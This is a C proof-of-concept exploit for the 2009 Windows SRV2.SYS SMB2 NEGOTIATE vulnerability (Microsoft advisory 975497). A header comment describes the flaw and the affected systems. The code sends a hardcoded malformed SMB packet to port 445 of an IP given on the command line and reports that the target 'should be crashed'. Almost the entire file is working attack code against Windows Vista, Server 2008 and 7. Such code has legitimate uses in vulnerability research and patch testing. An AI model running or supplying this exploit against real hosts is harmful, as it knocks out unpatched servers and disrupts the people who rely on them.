/*
 *
 * SMB SRV2.SYS Denial of Service PoC
 * Release Date: Sep 8, 2009
 * Severity: Medium/High
 * Systems Affected: Windows Vista SP1+SP2, Windows 2008 SP2, Windows 7 Beta + RC
 * Discovered by: Laurent Gaffi?
 *
 * Description:
 *              SRV2.SYS fails to handle malformed SMB headers for the NEGOTIATE PROTOCOL REQUEST functionnality.
 *              The NEGOTIATE PROTOCOL REQUEST is the first SMB query a client send to a SMB server, and it's used
 *              to identify the SMB dialect that will be used for futher communication.
 *
 * KB: http://www.microsoft.com/technet/security/advisory/975497.mspx
*/

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "WS2_32.lib")

char buff[] =
                "\x00\x00\x00\x90" // Begin SMB header: Session message
                "\xff\x53\x4d\x42" // Server Component: SMB
                "\x72\x00\x00\x00" // Negociate Protocol
                "\x00\x18\x53\xc8" // Operation 0x18 & sub 0xc853
                "\x00\x26" // Process ID High: --> :) normal value should be "\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
                "\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
                "\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
                "\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
                "\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
                "\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
                "\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
                "\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
                "\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
                "\x30\x30\x32\x00";
                
int main(int argc, char *argv[]) {
        
        
        if (argc < 2) {
                printf("Syntax: %s [ip address]\r\n", argv[0]);
                return -1;
        }
        
        WSADATA WSAdata;
        WSAStartup(MAKEWORD(2, 2), &WSAdata);
        
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
        char *host = argv[1];
        
        // fill in sockaddr and resolve the host
        SOCKADDR_IN ssin;
        memset(&ssin, 0, sizeof(ssin));
        ssin.sin_family = AF_INET;
        ssin.sin_port = htons((unsigned short)445);
        ssin.sin_addr.s_addr = inet_addr(host);
        
        printf("Connecting to %s:445... ", host);
        if (connect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == -1) {
                printf("ERROR!\r\n");
                return 0;
        }
        printf("OK\r\n");
        
        printf("Sending malformed packet... ");
        if (send(sock, buff, sizeof(buff), 0) <= 0) {
                printf("ERROR!\r\n");
                return 0;
        }
        printf("OK\r\n");
        
        printf("Successfully sent packet!\r\nTarget should be crashed...\r\n");
        
        // Close the socket
        closesocket(sock);
        WSACleanup();
        
        return 1;
}
